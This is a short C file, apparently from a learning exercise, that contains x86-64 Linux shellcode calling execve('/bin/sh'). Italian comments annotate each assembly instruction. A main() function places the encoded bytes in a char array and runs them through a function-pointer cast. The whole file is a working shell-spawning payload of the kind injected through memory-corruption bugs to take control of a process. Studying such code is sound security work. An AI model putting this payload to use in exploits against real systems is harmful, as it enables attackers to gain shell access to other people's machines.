/*
 * execve("/bin/sh", ["/bin/sh"], NULL)
 *
 *    xorq    %rdx, %rdx                ; Azzera %rdx (3° arg: envp = NULL)
 *    movq    $0x68732f6e69622f2f, %rbx ; Carica "//bin/sh" in %rbx
 *    shr     $0x8, %rbx                ; Shift per terminatore null (/bin/sh\0)
 *    pushq   %rbx                      ; Push stringa sullo stack
 *    movq    %rsp, %rdi                ; 1° arg: executable path (punta allo stack)
 *    pushq   %rdx                      ; Push NULL (terminatore array argv).
 *    pushq   %rdi                      ; Push puntatore a "/bin/sh"
 *    movq    %rsp, %rsi                ; 2° arg: argv (punta allo stack)
 *    pushq   $0x3b                     ; Push 59 (sys_execve)
 *    popq    %rax                      ; Pop in %rax. Azzera anche i bit superiori.
 *    syscall                           ; Esegue la system call
 */

int main(void)
{
   char shellcode[] =
        "\x48\x31\xd2"                                  // xor    %rdx, %rdx
        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov    $0x68732f6e69622f2f, %rbx
        "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
        "\x53"                                          // push   %rbx
        "\x48\x89\xe7"                                  // mov    %rsp, %rdi
        "\x52"                                          // push   %rdx
        "\x57"                                          // push   %rdi
        "\x48\x89\xe6"                                  // mov    %rsp, %rsi
        "\x6a\x3b"                                      // push   $0x3b
        "\x58"                                          // pop    %rax
        "\x0f\x05";                                     // syscall

    (*(void (*)()) shellcode)();
     
    return 0;
}


